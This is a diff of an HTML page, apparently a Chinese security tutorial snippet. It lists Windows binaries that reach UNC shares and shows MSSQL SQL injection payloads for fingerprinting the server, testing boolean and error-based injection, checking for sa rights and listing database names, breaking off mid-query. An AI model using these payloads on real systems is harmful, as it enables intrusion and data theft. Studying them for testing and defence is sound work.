@@ -646,7 +646,7 @@ net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunl
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&lt;01&gt; ORIGINAL_LOGIN(); --sa  0x01 利用报错注入数据  判断存在注入  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&lt;&gt;(select name from master.
+        0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&lt;01&gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&lt;&gt;(select name from master.
     </p>
 
     
